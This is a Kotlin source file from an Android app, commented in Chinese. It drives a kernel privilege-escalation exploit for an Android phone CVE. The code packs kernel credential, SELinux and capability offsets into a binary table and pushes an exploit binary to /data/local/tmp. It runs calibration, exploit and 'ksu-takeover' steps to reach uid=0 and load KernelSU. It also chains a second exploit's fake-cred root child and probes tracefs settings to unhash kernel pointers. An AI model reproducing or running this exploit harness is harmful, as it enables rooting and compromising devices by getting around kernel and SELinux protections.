package com.extractkit.app

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * CVE-2026-98937 后端（荣耀 Magic6 Pro 那条链）。
 *
 * 和我们的 98260 是**两个不同漏洞**，但产物一样：拿到 uid=0 → 载入 KernelSU。
 * 它的原生程序接受一份 308 字节的「内核表」二进制（framed blob），格式来自
 * `KernelProfileSerializer`：
 *
 * ```
 * u32be length                     ← 这一层容易漏，漏了会报 "profile length invalid"
 * char magic[4] = "C982"
 * u16 version = 4
 * u16 recommend_shizuku
 * u64 page_offset, timer_link, cred_link, selinux_link,
 *     user_ns, root_user, groups, ucounts          (8 × u64)
 * u32 task_cred, task_struct_size, cred_uid, kitimer_node
 * char release[128]  (NUL padded)
 * char vuln_type[32] (NUL padded)
 * u64 kitimer_size, task_alloc_link
 * u32 cred_size, cap_inh, cap_perm, cap_eff, cap_bset, cap_amb,
 *     cred_security, cred_user, cred_user_ns, cred_ucounts, cred_groups
 * ```
 *
 * 命令：`calibrate-a` → `calibrate-b` → `exploit --slide --page-offset` → `ksu-takeover`
 */
object Cve98937 {

    private const val WORK = "/data/local/tmp/extract-kit"
    private const val BIN = "$WORK/cve98937"
    private const val HOME = "$WORK/gk98937"
    private const val PAGE_OFFSET = -0x8080000000L   // 0xffffff7f80000000

    /** 一条 98937 内核表。地址是绝对内核地址（不含 KASLR slide）。 */
    data class Table(
        val release: String,
        val pageOffset: Long = PAGE_OFFSET,
        val timerLink: Long,
        val credLink: Long,
        val selinuxLink: Long,
        val userNs: Long,
        val rootUser: Long,
        val groups: Long,
        val ucounts: Long,
        val taskCred: Int,
        val taskStructSize: Int,
        val credUid: Int,
        val kitimerNode: Int = 0x78,
        val kitimerSize: Int,
        val credSize: Int,
        val capInheritable: Int = 0x30,
        val capPermitted: Int = 0x38,
        val capEffective: Int = 0x40,
        val capBset: Int = 0x48,
        val capAmbient: Int = 0x50,
        val credSecurity: Int = 0x80,
        val credUser: Int = 0x88,
        val credUserNs: Int = 0x90,
        val credUcounts: Int = 0x98,
        val credGroups: Int = 0xa0,
        val vulnType: String = "cve-2026-98937",
    )

    /** 308 字节表体（不含长度前缀）。 */
    fun body(t: Table): ByteArray {
        val b = ByteBuffer.allocate(308).order(ByteOrder.LITTLE_ENDIAN)
        b.put("C982".toByteArray(Charsets.US_ASCII))
        b.putShort(4)
        b.putShort(1)
        for (v in listOf(
            t.pageOffset, t.timerLink, t.credLink, t.selinuxLink,
            t.userNs, t.rootUser, t.groups, t.ucounts,
        )) b.putLong(v)
        for (v in listOf(t.taskCred, t.taskStructSize, t.credUid, t.kitimerNode)) b.putInt(v)
        putFixed(b, t.release, 128)
        putFixed(b, t.vulnType, 32)
        b.putLong(t.kitimerSize.toLong())
        b.putLong(0L) // task_alloc_link
        for (v in listOf(
            t.credSize, t.capInheritable, t.capPermitted, t.capEffective, t.capBset,
            t.capAmbient, t.credSecurity, t.credUser, t.credUserNs, t.credUcounts, t.credGroups,
        )) b.putInt(v)
        return b.array()
    }

    /** 带大端长度前缀的完整 blob（喂给原生程序的就是这个）。 */
    fun blob(t: Table): ByteArray {
        val body = body(t)
        return ByteBuffer.allocate(4 + body.size).order(ByteOrder.BIG_ENDIAN)
            .putInt(body.size).put(body).array()
    }

    private fun putFixed(b: ByteBuffer, s: String, size: Int) {
        val raw = s.toByteArray(Charsets.UTF_8)
        val n = minOf(raw.size, size - 1)
        b.put(raw, 0, n)
        repeat(size - n) { b.put(0) }
    }

    // ------------------------------------------------------------ 运行

    /** 把 libcve98937.so 从 assets 推到设备并 chmod（sha 相同则跳过）。 */
    suspend fun deploy(ctx: Context, log: (String) -> Unit): Boolean = withContext(Dispatchers.IO) {
        // 资产里存的是 gzip（.so 在 assets 里不会被打进压缩流，8MB 太占体积）
        val raw = runCatching { ctx.assets.open("be/libcve98937.so.gz").readBytes() }.getOrNull()
        val bytes = raw?.let {
            if (it.size > 2 && it[0] == 0x1f.toByte() && it[1] == 0x8b.toByte()) {
                runCatching {
                    java.util.zip.GZIPInputStream(it.inputStream()).use { g -> g.readBytes() }
                }.getOrNull()
            } else it
        }
        if (bytes == null) {
            log("! 内置镜像里没有 cve98937 后端")
            return@withContext false
        }
        if (!Shell.connected() && !Shell.connect(ctx)) {
            log("! shell 未就绪")
            return@withContext false
        }
        Shell.exec("mkdir -p $WORK $HOME")
        val (rc, _) = Shell.pushFile(BIN, bytes, executable = true)
        if (rc != 0) {
            log("! cve98937 推送失败")
            return@withContext false
        }
        Shell.exec("chmod 755 $BIN")
        log("✓ cve98937 后端就绪（${bytes.size / 1024} KB）")
        true
    }

    /** 跑一条子命令；blob 从 stdin 喂进去。 */
    suspend fun run(ctx: Context, table: Table, cmd: String, log: (String) -> Unit): Pair<Boolean, String> =
        withContext(Dispatchers.IO) {
            if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false to ""
            val blobPath = "$WORK/gk98937.blob"
            Shell.pushFile(blobPath, blob(table), executable = false)
            val line = "cd $WORK && CVE98937_HOME=$HOME sh -c 'cat $blobPath | $BIN $cmd'"
            log("· $cmd")
            val (code, out) = Shell.exec("$line 2>&1")
            out.lineSequence().filter { it.isNotBlank() }.forEach { log("  $it") }
            val ok = out.contains("C98937_STATUS") && out.contains("ok") ||
                out.contains("KSU_LOADED") || out.contains("C98937_KSU=loaded")
            ok to out
        }


    /**
     * 跑会 fork 后台进程的命令（exploit / ksu-takeover）。
     *
     * 关键：这类命令会留下 daemon（rootd）并继承 stdout，直接 `exec` 等 EOF 会**永远卡住**。
     * 所以放后台、输出落文件，然后轮询文件里的标记。
     */
    suspend fun runDetached(
        ctx: Context,
        table: Table,
        cmd: String,
        log: (String) -> Unit,
        timeoutMs: Long = 180_000,
        doneMarkers: List<String> = listOf(
            "inject ok", "exploit ok", "KSU_LOADED", "C98937_KSU=loaded",
            // 明确的终局失败也算「结束」，否则要白等到超时，界面上一直显示执行中
            "holding zombie", "no candidates", "exploit failed",
        ),
    ): Pair<Boolean, String> = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false to ""
        val blobPath = "$WORK/gk98937.blob"
        val outPath = "$WORK/gk98937.out"
        Shell.pushFile(blobPath, blob(table), executable = false)
        Shell.exec("rm -f $outPath")
        log("· $cmd（后台，最多等 ${timeoutMs / 1000}s）")
        Shell.exec(
            "cd $WORK && ( export CVE98937_HOME=$HOME; " +
                "cat $blobPath | $BIN $cmd > $outPath 2>&1 & ) ; echo started",
        )

        val deadline = System.currentTimeMillis() + timeoutMs
        var printed = 0
        var last = ""
        while (System.currentTimeMillis() < deadline) {
            kotlinx.coroutines.delay(1200)
            val text = Shell.exec("cat $outPath 2>/dev/null").second
            if (text.length > printed) {
                text.substring(printed).lineSequence()
                    .filter { it.isNotBlank() }
                    .forEach { log("  $it") }
                printed = text.length
            }
            last = text
            if (doneMarkers.any { text.contains(it) }) break
            // 进程没了 + 已经有输出 → 认为结束（避免等满整个超时）
            if (text.isNotEmpty()) {
                val alive = Shell.exec("pidof cve98937 2>/dev/null").second.isNotBlank()
                if (!alive) break
            }
        }
        val ok = last.contains("KSU_LOADED") || last.contains("C98937_KSU=loaded") ||
            last.contains("inject ok") || last.contains("exploit ok") ||
            last.contains("C98937_STATUS ksu-takeover ok")
        ok to last
    }


    /** 注入参数（对应原生程序的 --duration / --period / --force）。 */
    data class Params(
        val durationSec: Int = 3,
        val period: Int = 0,
        val waitSec: Int = 90,
        val force: Boolean = false,
        /** true=借 98260 的 root 子进程；false=纯 98937（默认） */
        val rootChild: Boolean = false,
    ) {
        fun exploitArgs(slide: String, pageOffset: String): String = buildString {
            append("exploit --slide ").append(slide)
            append(" --page-offset ").append(pageOffset)
            if (durationSec > 0) append(" --duration ").append(durationSec)
            if (period > 0) append(" --period ").append(period)
            if (force) append(" --force")
        }
    }

    private const val PREF = "c98937"

    fun params(ctx: Context): Params {
        val sp = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        return Params(
            durationSec = sp.getInt("duration", 3),
            period = sp.getInt("period", 0),
            waitSec = sp.getInt("wait", 90),
            force = sp.getBoolean("force", false),
            rootChild = sp.getBoolean("rootChild", false),
        )
    }

    fun saveParams(ctx: Context, p: Params) {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putInt("duration", p.durationSec)
            .putInt("period", p.period)
            .putInt("wait", p.waitSec)
            .putBoolean("force", p.force)
            .putBoolean("rootChild", p.rootChild)
            .apply()
    }


    /**
     * 把 98937 的注入放进 **98260 的 root 子进程**里执行。
     *
     * 为什么要这样：98937 自己是以普通 shell 跑的，`mlockall()` 因 RLIMIT_MEMLOCK 报
     * ENOMEM(errno=12) 而失败，抢页条件不成立 → captured 一直是 0。
     * 借 98260 的 fake cred 子进程（uid=0 + 全 caps + kernel 域）跑，锁内存才锁得住。
     */
    suspend fun runInRootChild(
        ctx: Context,
        table: Table,
        innerCmd: String,
        log: (String) -> Unit,
        timeoutMs: Long = 180_000,
    ): Pair<Boolean, String> = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false to ""

        val stage = "$WORK/c98937_stage.sh"
        val out = "$WORK/c98937_root.out"
        val blobPath = "$WORK/gk98937.blob"
        Shell.pushFile(blobPath, blob(table), executable = false)

        // 1) 写 worker 脚本（这段会以 root 子进程身份执行）
        //    注意：不能用 heredoc —— 经过 `sh -c` 会被吃掉，脚本变空，白等一轮。
        val script = buildString {
            appendLine("#!/system/bin/sh")
            appendLine("export CVE98937_HOME=$HOME")
            appendLine("echo \"[root-child] uid=$(id -u) attr=$(cat /proc/self/attr/current)\"")
            appendLine("cat $blobPath | $BIN $innerCmd")
            appendLine("echo \"[root-child] rc=$?\"")
        }
        if (!writeScript(ctx, stage, script)) {
            log("! worker 脚本写入失败")
            return@withContext false to ""
        }
        log("· 98937 注入改由 root 子进程执行")
        Shell.exec("rm -f $out")

        // 2) 让 98260 payload 以 fake 模式起 root 子进程，并指向我们的脚本
        val payload = "$WORK/cve-2026-98260-uid0"
        Shell.exec(
            "cd $WORK && ( EXTRACTKIT_STAGE=$stage $payload fake > $out 2>&1 & ) ; echo started",
        )

        val deadline = System.currentTimeMillis() + timeoutMs
        var printed = 0
        var last = ""
        while (System.currentTimeMillis() < deadline) {
            kotlinx.coroutines.delay(1500)
            val text = Shell.exec("cat $out 2>/dev/null").second
            if (text.length > printed) {
                text.substring(printed).lineSequence().filter { it.isNotBlank() }
                    .forEach { log("  $it") }
                printed = text.length
            }
            last = text
            if (last.contains("[root-child] rc=")) break
        }
        val ok = last.contains("C98937_STATUS inject ok") || last.contains("KSU_LOADED") ||
            last.contains("[root-child] rc=0")
        ok to last
    }

    /** 直接从 App 写一段可执行脚本到设备。 */
    suspend fun writeScript(ctx: Context, path: String, body: String): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        val tmp = "$WORK/tmp_script.sh"
        shellWrite(tmp, body)
        Shell.exec("chmod 755 $tmp; mv $tmp $path")
        true
    }

    private suspend fun shellWrite(path: String, body: String) = withContext(Dispatchers.IO) {
        Shell.pushFile(path, body.toByteArray(), executable = true)
    }


    /**
     * 98937 能不能纯跑，取决于本机 tracefs 对 shell 的放行程度。
     *
     * 它会去读文本 `trace`，而文本 trace 里的 `call_site` / `ptr` 默认是
     * 符号化 + `%p` 哈希的；要拿到真地址必须能切 `options/sym-addr` 和
     * `options/hash-ptr`。BVL（6.1.157）那台允许，我们这台被 SELinux 挡住。
     */
    suspend fun tracefsAllowed(ctx: Context): Boolean = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        val probe =
            "echo 1 > /sys/kernel/tracing/options/sym-addr 2>&1 && echo OK1; " +
                "echo 0 > /sys/kernel/tracing/options/hash-ptr 2>&1 && echo OK2; " +
                "echo 1 > /sys/kernel/tracing/events/kmem/mm_page_alloc/enable 2>&1 && echo OK3"
        // 先按 root 身份试：已经 root 的机器上 shell 域仍可能被 SELinux 拒
        val (rc, rootOut) = Shell.exec("su -c '$probe' 2>&1")
        if (rootOut.contains("OK1") || rootOut.contains("OK2") || rootOut.contains("OK3")) return@withContext true
        val (_, out) = Shell.exec(probe)
        out.contains("OK1") || out.contains("OK2") || out.contains("OK3")
    }

    /** 从输出里抓某个 `KEY=value`。 */
    fun field(out: String, key: String): String? =
        out.lineSequence().firstOrNull { it.startsWith("$key=") }?.substringAfter('=')?.trim()
}
